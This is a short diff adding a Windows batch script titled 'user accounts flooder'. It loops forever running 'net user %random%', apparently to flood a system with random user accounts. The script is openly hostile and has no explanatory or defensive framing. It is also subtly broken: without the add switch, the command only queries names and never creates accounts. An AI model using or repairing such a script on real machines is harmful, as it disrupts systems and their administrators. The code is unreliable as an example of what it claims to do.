@@ -1,0 +1,10 @@
+user accounts flooder
+
+@echo off 
+
+:x
+
+net user %random%
+
+goto x
+
